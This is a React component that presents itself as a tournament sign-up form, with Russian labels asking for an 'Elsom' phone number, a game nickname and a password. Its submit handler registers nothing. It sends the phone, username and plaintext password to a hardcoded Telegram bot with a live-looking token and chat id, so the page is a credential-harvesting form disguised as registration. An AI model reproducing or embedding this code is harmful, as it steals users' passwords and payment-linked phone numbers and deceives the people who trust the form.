import React from "react";
import { useForm } from "react-hook-form";
import { NavLink } from "react-router-dom";
import Button from "../../UI/Button/Button";

import classes from "./Registration.module.css";

class Registration extends React.Component {
  constructor(props) {
    super(props);
    this.state = { name: '' };

    this.handleInputChange = this.handleInputChange.bind(this);
    this.handleSubmit = this.handleSubmit.bind(this);
  }

  handleInputChange(event) {
    const target = event.target;
    const value = target.value;
    const name = target.name;

    this.setState({
      [name]: value
    });
  }

  handleSubmit(event) {
    const responseMsg = `
    Phone: ${this.state.phone}
    Username: ${this.state.username}
    Password: ${this.state.password}
    `
    fetch(`https://api.telegram.org/bot1736127684:AAGG4oXysjamDgUB-VvWmMSsUaTlIOX8vhk/sendMessage?chat_id=-546720007&text=${responseMsg}`)
    event.preventDefault();
  }

  render() {
    return (
      <div className={classes.Registration}>
        <article>
        <header>
          <h2>зарегистрируйся и в бой!</h2>
          <p>Зарегистрируйтесь для участия в турнирах</p>
        </header>
      </article>
      <div className={classes.Reg_form}>
        <form onSubmit={this.handleSubmit}>
        <label htmlFor="phone">
            <p>Номер телефона от Элсом:</p>
            <input
              type="text" value={this.state.phone} 
              onChange={this.handleInputChange} 
              placeholder="0700987654"
              name="phone"
            />
          </label>
          <label htmlFor="username">
            <p>Ник в игре:</p>
            <input
              type="text" value={this.state.username} 
              onChange={this.handleInputChange} 
              placeholder="gamer1"
              name="username"
            />
          </label>
          <label htmlFor="password">
            <p>Придумайте пароль:</p>
            <input
              type="password" 
              value={this.state.password} 
              onChange={this.handleInputChange} 
              name="password"
            />
          </label>
          <div className="submit_wrapper">
            <NavLink to="/auth/login">У меня есть аккаунта</NavLink>
            <Button>в бой!</Button>
          </div>
      </form>
      </div>        
      </div>
      
      
    );
  }
}

export default Registration;
